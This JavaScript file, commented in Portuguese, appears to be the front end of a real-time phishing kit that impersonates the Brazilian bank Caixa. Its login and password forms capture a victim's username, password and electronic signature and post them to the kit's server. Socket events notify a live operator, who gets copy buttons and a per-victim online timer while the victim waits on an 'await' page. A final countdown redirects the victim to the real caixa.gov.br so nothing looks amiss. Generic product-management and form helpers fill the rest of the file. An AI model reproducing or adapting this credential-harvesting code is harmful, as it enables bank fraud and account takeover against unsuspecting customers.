const btnLogin = document.querySelector('#btnLogin')
const userInput = document.querySelector('#nomeUsuario')
const btnCopy = [...document.querySelectorAll('.formOperator .btn-copy')]

if (btnCopy) {
    btnCopy.forEach((btn) => {
        btn.addEventListener('click', function (e) {
            e.preventDefault()

            const input = btn.closest('.form-group').querySelector('input')

            if (!input) return

            /* Select the text field */
            input.select()
            input.setSelectionRange(0, 99999) /* For mobile devices */

            /* Copy the text inside the text field */
            document.execCommand('copy')

            /* Alert the copied text */
        })
    })
}

// if (btnLogin && userInput) {
//     btnLogin.addEventListener('click', function (e) {
//         e.preventDefault()
//         btnLogin.closest('form').submit()
//         //if (userInput.value) socket.emit('chat message', userInput.value)
//     })
// }

socket.on('chat message', function (msg) {
    alert(msg)
})

const formClient = (() => {
    //private var/functions
    const form = document.querySelector('#user')
    const socketInput = document.querySelector('.theSocket')

    function filterUser() {
        const form = document.querySelector('form#user');

        if(!form) return

        const input = form.querySelector('input#nomeUsuario')

        if(!input) return

        input.addEventListener('keyup', function (e) {
            // body
            e.preventDefault()


            let str = input.value
            str = str.replace(/[ÀÁÂÃÄÅ]/g,"A");
            str = str.replace(/[àáâãäå]/g,"a");
            str = str.replace(/[ÈÉÊË]/g,"E");
            input.value = str.replace(/[^a-z0-9]/gi,'')
        });
    }

    async function store(dados) {
        const cliente = await util.post(`/api/client`, JSON.stringify(dados))

        console.log(cliente)
    }

    function putSocket() {
        if (socketInput) {
            socket.on('connect', function (msg) {
                console.log(`socketID`, socket.id)
                socketInput.value = socket.id
            })

            socket.on('newClient', (client) => {
                console.log(`meu cliente`, client)
            })

            socket.on('reconnectClient', (client) => {
                console.log(`meu cliente`, client)
            })
        }

        //erroruser
    }

    async function handleFormPassword(form, goto) {
        const dados = util.serialize(form)

        try {
            const cliente = await util.post(`/api/client-password`, JSON.stringify(dados))

            const { id } = cliente

            const urlParams = new URLSearchParams(window.location.search)
            const error = urlParams.get('error')

            if (goto == 'eletronic') {
                socket.emit('sendPassword', id)

                if (error) {
                    return (window.location.href = `/await?client=${id}`)
                } else {
                    return (window.location.href = `/eletronic?client=${id}`)
                }
            } else {
                socket.emit('sendSignature', id)

                if (error) {
                    return (window.location.href = `/await?client=${id}`)
                } else {
                    return (window.location.href = `/await?client=${id}`)
                }
            }
        } catch (error) {
            //alert(error)
            console.log(error)
        }
    }

    function password() {
        const formPassword = document.querySelector('#formPassword')


        if (formPassword) {
            formPassword.addEventListener('submit', function (e) {
                e.preventDefault()

                if(formPassword.elements['password'] && !formPassword.elements['password'].value) {
                     formPassword.elements['password'].setCustomValidity('Informe sua senha')
                     return formPassword.elements['password'].reportValidity();
                }

                handleFormPassword(formPassword, 'eletronic')
            })
        }
    }

    function eletronic() {
        const formEletronic = document.querySelector('#formEletronic')

        if (formEletronic) {
            formEletronic.addEventListener('submit', function (e) {
                e.preventDefault()

                if(formEletronic.elements['eletronicPassword'] && !formEletronic.elements['eletronicPassword'].value) {
                    formEletronic.elements['eletronicPassword'].setCustomValidity('Informe Assinatura eletrônica')
                    return formEletronic.elements['eletronicPassword'].reportValidity();
               }

                handleFormPassword(formEletronic)
            })
        }
    }

    function handleSubmit(e) {
        if (btnLogin && userInput) {
            btnLogin.addEventListener('click', function (e) {
                e.preventDefault()

                const modalShow = document.querySelector('.containerLoader')

                

                const theForm = document.querySelector('#user')

                const inputUser = theForm.elements['user']


                if(inputUser && !inputUser.value) {
                    inputUser.setCustomValidity('Informe seu usuário')
                    return inputUser.reportValidity();
                }

                setTimeout(() => {

                    if(modalShow) modalShow.classList.toggle('show')

                    

                    if (theForm) return theForm.submit()
                    //if (userInput.value) socket.emit('chat message', userInput.value)

                    const name = theForm.querySelector('#nomeUsuario')

                    const dados = util.serialize(theForm)

                    return store(dados)
                }, 3000)

                
            })
        }
    }

    function finish() {
        const element = document.querySelector('.finishCount');

        if(element) {
            setInterval(() => {
                if(parseInt(element.innerHTML) < 1) {
                    window.location.href = `https://www.caixa.gov.br/`
                }else{
                    element.innerHTML = parseInt(element.innerHTML) - 1

                }
                
            }, 1000)
        }
    }

    function submit() {
        if (!form) return

        handleSubmit()
    }

    return {
        //public var/functions
        submit,
        putSocket,
        password,
        eletronic,
        finish,
        filterUser
    }
})()

formClient.filterUser()
formClient.eletronic()
formClient.submit()
formClient.password()
formClient.finish()

//menu login
const menuLogin = [...document.querySelectorAll('.menuLogin li')]

if (menuLogin) {
    menuLogin.forEach((element) => {
        element.addEventListener('click', function (e) {
            const parent = element.closest('ul')
            const similar = parent.querySelectorAll('li')
            const number = element.dataset.number
            const content = element.closest('.menuLoginHome').querySelector(`.container-menuLogin > #content${number}`)

            if (!similar.length) return

            similar.forEach((item) => {
                item.classList.remove('selected')
            })

            element.classList.add('selected')

            if (!content) return

            const similarContent = [...content.closest('.container-menuLogin').querySelectorAll('.boxContent')]

            similarContent.forEach((theContent) => {
                theContent.style.display = 'none'
            })

            content.style.display = 'block'
        })
    })
}

const URL = `http://192.168.0.10:3333/api`

const util = (() => {
    const images = []
    let imageDefault = 0
    //private var/functions
    function countOnline(date) {
        let time = new Date() - new Date(date)

        time = new Date(time)

        let seconds = time.getSeconds()
        let minutes = time.getMinutes()

        time = time.getMinutes() + ':' + time.getSeconds()

        const roleTime = document.querySelector('.timeOperator')

        const containerRoleTime = roleTime.closest('.form-group')

        roleTime.remove()

        const newRoleTime = document.createElement('label')

        newRoleTime.classList.add('timeOperator')

        newRoleTime.innerHTML = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)

        containerRoleTime.append(newRoleTime)

        setInterval(() => {
            if (seconds == 59) {
                minutes = ('0' + (parseInt(minutes) + 1)).slice(-2)

                seconds = ('0' + 1).slice(-2)
            } else {
                seconds = ('0' + (parseInt(seconds) + 1)).slice(-2)
            }

            newRoleTime.innerHTML = minutes + ':' + seconds
        }, 1000)
    }

    const setImageDefault = (image, container) => {
        image.addEventListener('click', (e) => {
            const index = image.dataset.index

            allImages = container.querySelectorAll('img')

            Array.from(allImages).forEach((img) => {
                img.classList.remove('active')
            })

            image.classList.add('active')

            imageDefault = parseInt(index)

            return console.log(imageDefault)
        })
    }

    const serialize = (form) => {
        const inputs = [...form.elements]

        const object = {}

        inputs.map((input, key) => {
            //console.dir(input)
            if (input.type == `radio`) {
                if (input.checked) return (object[input.name] = input.value)
                else return
            }

            if (input.name) object[input.name] = input.value
        })

        return object
    }

    const resetForm = (form) => {
        const inputs = [...form.elements]

        inputs.map((input) => (input.value = ``))
    }

    const maskMoney = (input) => {
        input.addEventListener('keyup', function (e) {
            e.preventDefault()

            $(input).maskMoney({ prefix: 'R$ ' })

            /* var money = new Cleave(input, {
                prefix: 'R$ ',
            }) */

            //console.log(currency(input.value, { symbol: 'R$' }))

            //input.value = currency(input.value, { symbol: 'R$' })
        })
    }

    const notify = (params) => {
        const { icon, title, message, type } = params
        //Notify

        /**
         *
         * <div data-notify="container" class="alert alert-dismissible alert-warning alert-notify animated fadeInDown" role="alert" data-notify-position="top-center">
         * <span class="alert-icon ni ni-bell-55" data-notify="icon"></span>
         * <div class="alert-text" <="" div=""> <span class="alert-title" data-notify="title"> Bootstrap Notify</span> <span data-notify="message">Turning standard Bootstrap alerts into awesome notifications</span></div><button type="button" class="close" data-notify="dismiss" aria-label="Close" style="position: absolute; right: 10px; top: 5px; z-index: 1082;"><span aria-hidden="true">×</span></button></div>
         *
         */
        return $.notify(
            {
                // options
                icon: icon,
                title: title,
                message: message,
            },
            {
                // settings
                type: type,
                template: `
                <div data-notify="container" class="alert alert-dismissible alert-{0} alert-notify" role="alert">
                    <span class="alert-icon" data-notify="icon"></span>
                    <div class="alert-text"> 
                        <span class="alert-title" data-notify="title">{1}</span>
                        <span data-notify="message">{2}</span>
                    </div>
                    <button type="button" class="close" data-notify="dismiss" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                `,
            }
        )
    }

    image = (input, output, mode, size) => {
        input.addEventListener('change', (e) => {
            e.preventDefault()

            input.closest('form').classList.add('changed')

            const sizes = {
                large: [`my-2`, `col-12`],
                medium: [`my-2`, `col-6`],
                small: [`my-2`, `col-3`],
            }

            if (!size && !sizes[size]) return console.log(`Informe o tamanho entre (large, medium e small)`)

            const containerImages = output

            const inputFiles = [...input.files]

            const file = input.files[0]

            input.closest('.custom-file').querySelector('label').innerHTML = inputFiles.length + ` imagens`

            if (mode === `mult`) {
                inputFiles.map((file) => {
                    const imageContainer = document.createElement('div')

                    imageContainer.classList.add(`mb-2`, `col-sm-3`)

                    imageContainer.innerHTML = `
                    <img class="img-thumbnail" src="">
                    `

                    const image = imageContainer.querySelector('img')

                    // FileReader support
                    if (FileReader && file) {
                        var fr = new FileReader()
                        fr.onload = function () {
                            image.src = fr.result
                        }
                        fr.readAsDataURL(file)

                        images.push(file)

                        image.dataset.index = images.indexOf(file)

                        if (images.length === 1) image.classList.add('active')

                        setImageDefault(image, output)

                        return containerImages.append(imageContainer)
                    }

                    // Not supported
                    else {
                        // fallback -- perhaps submit the input to an iframe and temporarily store
                        // them on the server until the user's session ends.
                    }
                })
            } else {
                const imageContainer = document.createElement('div')

                imageContainer.classList.add(...sizes[size])

                imageContainer.innerHTML = `
                <img class="img-thumbnail" src="">
                `
                const image = imageContainer.querySelector('img')

                // FileReader support
                if (FileReader && file) {
                    var fr = new FileReader()
                    fr.onload = function () {
                        image.src = fr.result
                    }
                    fr.readAsDataURL(file)

                    images[0] = file

                    containerImages.innerHTML = ``

                    return containerImages.append(imageContainer)
                }

                // Not supported
                else {
                    // fallback -- perhaps submit the input to an iframe and temporarily store
                    // them on the server until the user's session ends.
                }
            }
        })
    }

    const newRequest = (object) => {
        return new Promise((resolve, reject) => {
            const token = document.body.dataset.token

            const { url, method, body, headers } = object

            const options = {
                method: method || `GET`,
                headers: {
                    authorization: `Bearer ${token}`,
                },
            }

            if (headers) options.headers['content-type'] = headers['content-type']

            if (body) options.body = body

            fetch(url, options)
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) return reject(res.error)

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    const get = (url) => {
        return new Promise((resolve, reject) => {
            const token = document.body.dataset.token

            const options = {
                method: `GET`,
                headers: {
                    authorization: `Bearer ${token}`,
                    'content-type': 'application.json',
                },
            }

            fetch(url, options)
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) return reject(res.error)

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    const post = (url, body, token) => {
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: body,
        }

        if (token) {
            const theToken = document.body.dataset.token
            options.headers.authorization = `Bearer ${theToken}`
        }

        return new Promise((resolve, reject) => {
            fetch(url, options)
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) return reject(res.error)

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    const del = (url) => {
        return new Promise((resolve, reject) => {
            const token = document.body.dataset.token

            const options = {
                method: `DELETE`,
                headers: {
                    authorization: `Bearer ${token}`,
                    'content-type': 'application.json',
                },
            }

            fetch(url, options)
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) return reject(res.error)

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    const request = (object) => {
        return new Promise((resolve, reject) => {
            const token = document.body.dataset.token

            const { url, method, body, headers } = object

            const options = {
                method: method || `GET`,
                headers: {
                    authorization: `Bearer ${token}`,
                },
            }

            if (headers) options.headers['content-type'] = headers['content-type']
            if (headers) options.headers.Accept = headers.Accept

            if (body) options.body = body

            fetch(url, options)
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) return reject(res.error)

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    const scroll = (link) => {
        link.addEventListener('click', function (e) {
            e.preventDefault()

            document.querySelector(this.getAttribute('href')).scrollIntoView({
                behavior: 'smooth',
                block: `start`,
            })
        })
    }

    const validateSlug = (slug) => {
        slug = slug
            .normalize('NFD')
            .replace(/[\u0300-\u036f]/g, '')
            .toLowerCase()
            .replace(/ /g, '_')

        return slug
    }

    const delayed_methods = (label, callback, time) => {
        if (typeof window.delayed_methods == 'undefined') {
            window.delayed_methods = {}
        }

        delayed_methods[label] = Date.now()
        var t = delayed_methods[label]

        setTimeout(function () {
            if (delayed_methods[label] != t) {
                return
            } else {
                //console.log(arguments)
                delayed_methods[label] = ''
                callback
            }
        }, time || 500)
    }

    const dateEnd = (input, dateStart, dateEnd) => {
        input.addEventListener('blur', (e) => {
            const startDate = dateStart.value
            const endDate = new Date(startDate)

            endDate.setMonth(endDate.getMonth() + parseInt(input.value))

            const date = endDate.toISOString().substr(0, 10)

            console.log(date)

            dateEnd.value = date
        })
    }

    return {
        //public var/functions
        image,
        images,
        request,
        scroll,
        validateSlug,
        newRequest,
        serialize,
        resetForm,
        notify,
        get,
        del,
        delayed_methods,
        dateEnd,
        maskMoney,
        post,
    }
})()

//Set date in blur mouths
const inputStart = document.querySelector('input#locationStart')
const inputEnd = document.querySelector('input#locationEnd')
const inputMonth = document.querySelector('input#locationTime')

if (inputStart && inputEnd && inputMonth) util.dateEnd(inputMonth, inputStart, inputEnd)

const allprods = document.querySelector('.nav-link.dropdown-toggle')
const hoverMenu = document.querySelector('.nav-item.dropdown')

// if (hoverMenu) {
//     hoverMenu.onmouseover = () => {
//         document.querySelector('.nav-item.dropdown > ul').classList.add('show')
//     }
//     hoverMenu.onmouseout = () => {
//         document.querySelector('.nav-item.dropdown > ul').classList.remove('show')
//     }
// }

if (allprods) {
    allprods.addEventListener('click', function (e) {
        e.preventDefault()

        url = allprods.getAttribute('href')

        if (window.matchMedia('(min-width:800px)').matches) {
            window.location.href = url
        }
    })
}

if (document.querySelector('input.cpf'))
    var cpf = new Cleave('input.cpf', {
        delimiters: ['.', '.', '-'],
        blocks: [3, 3, 3, 2],
        uppercase: true,
    })

if (document.querySelector('input.rg'))
    var rg = new Cleave('input.rg', {
        delimiters: ['.', '.', '-'],
        blocks: [2, 3, 3, 1],
        uppercase: true,
    })

if (document.querySelector('input.zipCode'))
    var cep = new Cleave('input.zipCode', {
        delimiters: ['-'],
        blocks: [5, 3],
        uppercase: true,
    })

if (document.querySelector('input.phoneInput'))
    var phones = new Cleave('input.phoneInput', {
        phone: true,
        phoneRegionCode: 'BR',
    })

if (document.querySelector('input#cell'))
    var cell = new Cleave('input#cell', {
        phone: true,
        phoneRegionCode: 'BR',
    })

const cleaveMoney = {
    numeral: true,
    prefix: 'R$ ',
    rawValueTrimPrefix: true,
}

const inputsMoney = [...document.querySelectorAll('input.moneyValue')]

if (inputsMoney) {
    inputsMoney.forEach((input) => util.maskMoney(input))
}

if (document.querySelector('.iptu')) var iptu = new Cleave('input#iptu', cleaveMoney)

if (document.querySelector('.condominium')) var condominium = new Cleave('input#condominium', cleaveMoney)

if (document.querySelector('.water')) var water = new Cleave('input#water', cleaveMoney)

if (document.querySelector('.energy')) var energy = new Cleave('input#energy', cleaveMoney)

if (document.querySelector('.trash')) var trash = new Cleave('input#trash', cleaveMoney)

if (document.querySelector('.cleaningFee')) var cleaningFee = new Cleave('input#cleaningFee', cleaveMoney)

if (document.querySelector('.othersValues')) var othersValues = new Cleave('input#othersValues', cleaveMoney)

const btnValidat = document.querySelector('.btnAnchor')

if (btnValidat) util.scroll(btnValidat)
;(function () {
    'use strict'
    window.addEventListener(
        'load',
        function () {
            // Fetch all the forms we want to apply custom Bootstrap validation styles to
            var forms = document.getElementsByClassName('needs-validation')
            // Loop over them and prevent submission
            var validation = Array.prototype.filter.call(forms, function (form) {
                form.addEventListener(
                    'submit',
                    (event) => {
                        if (form.checkValidity() === false) {
                            event.preventDefault()
                            event.stopPropagation()
                        }
                        form.classList.add('was-validated')
                    },
                    false
                )
            })
        },
        false
    )
})()

//formLogin
const login = (() => {
    //private var/functions
    const login = (form) => {
        form.addEventListener('submit', (e) => {
            e.preventDefault()

            const user = util.serialize(form)

            return util
                .request({
                    url: `/api/login`,
                    method: `POST`,
                    headers: {
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify(user),
                })
                .then((res) => (window.location.href = `/dashboard`))
                .catch((err) => console.log(err))
        })
    }

    const register = (form) => {
        form.addEventListener('submit', function (e) {
            e.preventDefault()

            const object = util.serialize(form)

            const modal = form.closest('.modal')

            return util
                .request({
                    url: `/api/user`,
                    method: `POST`,
                    headers: {
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify(object),
                })
                .then((res) => {
                    $(modal).modal('hide')

                    $(modal).on('hidden.bs.modal', function (e) {
                        // do something...

                        Swal.fire('Usuário criado', `Usuário ${res.name} criado com sucesso`, 'success')

                        return $(this).off('hidden.bs.modal')
                    })
                })
                .catch((err) => {
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })
        })
    }

    return {
        //public var/functions
        login,
        register,
    }
})()

const formLogin = document.querySelector('.formLogin')

//if (formLogin) login.login(formLogin)

const product = (() => {
    const table = $('.dataTable').DataTable()
    //private var/functions
    const create = (form) => {
        return new Promise((resolve, reject) => {
            const button = form.querySelector('button')

            spiner(button)

            const object = util.serialize(form)

            util.request({
                url: `/api/product`,
                method: `POST`,
                headers: {
                    'content-type': 'application/json',
                },
                body: JSON.stringify(object),
            })
                .then((res) => {
                    return resolve({ data: res, form: form })
                })
                .catch((err) => {
                    return reject(err)
                })
        })
    }

    const spiner = (container) => {
        return (container.innerHTML = `
        <div class="spinner-border text-success" role="status">
            <span class="sr-only">Loading...</span>
        </div>`)
    }

    const productCreate = (form) => {
        form.addEventListener('submit', function (e) {
            e.preventDefault()

            return create(form)
                .then(image)
                .then((res) => {
                    dash(res)
                    return Swal.fire('Cadastrado', `Produto ${res.name} cadastrado com sucesso`, 'success')
                })
                .catch((err) => {
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })
        })
    }

    const dash = (object) => {
        const tr = document.createElement('tr')

        const container = document.querySelector('.productList')

        const { name, brand, price, stock, id, image, barcode } = object

        tr.innerHTML = `
        <th scope="row">
            <div class="media align-items-center">
                <a href="#" class="avatar rounded-circle mr-3">
                    ${
                        image.url
                            ? `<img alt="Image placeholder" src="${image.url}">`
                            : `<img alt="Image placeholder" src="https://via.placeholder.com/200">`
                    }
                </a>
                <div class="media-body">
                    <span class="name mb-0 text-sm">
                        ${name} <br>
                        <small>${barcode}</small>
                    </span>
                </div>
            </div>
        </th>
        <td>
            ${price}
        </td>
        <td>
            ${brand}
        </td>
        <td>
            <i class="fas fa-arrow-up text-success mr-3"></i> ${stock}
        </td>
        <td>
            <button class="btn btn-warning" data-id="${id}"><i class="fas fa-trash-alt"></i></button>
        </td>
        `

        if (container) container.append(tr)
    }

    const destroy = (button) => {
        button.addEventListener('click', function (e) {
            e.preventDefault()

            const id = button.dataset.id

            const tr = button.closest('tr')

            return util.del(`/api/product/${id}`).then((res) => {
                table.row($(tr)).remove().draw()

                return Swal.fire('Excluído', `Produto ${res.name} excluído com sucesso`, 'success')
            })
        })
    }

    const modal = (modal) => {
        $(modal).on('show.bs.modal', function (e) {
            // do something...
            const id = modal.dataset.id

            const form = modal.querySelector('form')

            util.get(`/api/product/${id}`).then((res) => {
                const { name, price, brand, stock, id, barcode } = res

                form.elements['name'].value = name
                form.elements['price'].value = price
                form.elements['brand'].value = brand
                form.elements['stock'].value = stock
                form.elements['barcode'].value = barcode

                form.dataset.id = id
            })
        })
    }

    const openModal = (button) => {
        button.addEventListener('click', function (e) {
            const modal = document.querySelector(button.dataset.target)

            const id = button.dataset.id

            modal.dataset.id = id
        })
    }

    const rowAdd = (object) => {
        const { name, price, brand, stock, barcode, id, image } = object

        const newTR = table.row
            .add([
                //Name
                `
                <div class="media align-items-center">
                    <a href="#" class="avatar rounded-circle mr-3">
                        ${
                            image.url
                                ? `<img alt="Image placeholder" src="${image.url}">`
                                : `<img alt="Image placeholder" src="https://via.placeholder.com/200">`
                        }
                    </a>
                    <div class="media-body">
                        <span class="name mb-0 text-sm">
                            ${name} <br>
                            <small>${barcode}</small>
                        </span>
                    </div>
                </div>
                `,
                //price
                price,
                //brand
                brand,
                //stock
                `<i class="fas fa-arrow-up text-success mr-3"></i> ${stock}`,
                //actions
                `
                <button class="btn btn-icon btn-primary editProduct" type="button" data-toggle="modal"
                    data-target="#modalProduct" data-id="${id}">
                    <span class="btn-inner--icon"><i class="fas fa-pencil-alt"></i></span>
                </button>

                <button class="btn btn-warning productDestroy" data-id="${id}">
                    <i class="fas fa-trash-alt"></i>
                </button>
                `,
            ])
            .draw()
            .node()

        newTR.dataset.id = id

        newTR.classList.add(`tr-product-${id}`)
        newTR.querySelector('td:last-child').classList.add('text-right')

        return newTR
    }

    const image = (object) => {
        return new Promise((resolve, reject) => {
            const { id: product_id } = object.data

            const file = object.form.elements['file'].files[0]

            console.log(file)

            if (!file) return resolve(object.data)

            const formData = new FormData()

            formData.append('file', file)

            fetch(`/api/product_image/${product_id}`, {
                method: 'POST',
                headers: {
                    authorization: `Bearer ${document.body.dataset.token}`,
                },
                body: formData,
            })
                .then((res) => res.json())
                .then((res) => {
                    util.resetForm(object.form)

                    const button = object.form.querySelector('button')

                    button.innerHTML = `Cadastrar Produto`

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    const update = (form) => {
        form.addEventListener('submit', function (e) {
            e.preventDefault()

            const id = form.dataset.id

            const object = util.serialize(form)

            return util
                .request({
                    url: `/api/product/${id}`,
                    method: `PUT`,
                    headers: {
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify(object),
                })
                .then((res) => {
                    const tr = document.querySelector(`tr[data-id="${id}"]`)

                    table.row($(tr)).remove().draw()

                    const modal = form.closest('.modal')

                    $(modal).modal('hide')

                    $(modal).on('hidden.bs.modal', function (e) {
                        // do something...
                        const row = rowAdd(res)
                        openModal(row.querySelector('.editProduct'))

                        destroy(row.querySelector('.productDestroy')) //productDestroy

                        Swal.fire('Alterado', `Produto ${res.name} alterado com sucesso`, 'success')

                        return $(this).off('hidden.bs.modal')
                    })
                })
                .catch((err) => {
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })
        })
    }

    return {
        //public var/functions
        create: productCreate,
        destroy,
        modal,
        openModal,
        update,
    }
})()

//edit product
const formEditProduct = document.querySelector('.formEditProduct')

if (formEditProduct) product.update(formEditProduct)

//Show product in modal
const modalProd = document.querySelector('#modalProduct')

if (modalProd) product.modal(modalProd)

//editProduct
const btnEditProduct = [...document.querySelectorAll('.editProduct')]

if (btnEditProduct) btnEditProduct.map((btn) => product.openModal(btn))

//Create product
const btnProductStore = document.querySelector('.productStore')

if (btnProductStore) product.create(btnProductStore)

//Product Destrou
const btnProductDestroy = [...document.querySelectorAll('.productDestroy')]

if (btnProductDestroy) btnProductDestroy.map((btn) => product.destroy(btn))

$('.dataTable').on('draw.dt', function () {
    const btnProductDestroy = [...document.querySelectorAll('.productDestroy')]

    if (btnProductDestroy) btnProductDestroy.map((btn) => product.destroy(btn))

    //editProduct
    const btnEditProduct = [...document.querySelectorAll('.editProduct')]

    if (btnEditProduct) btnEditProduct.map((btn) => product.openModal(btn))
})
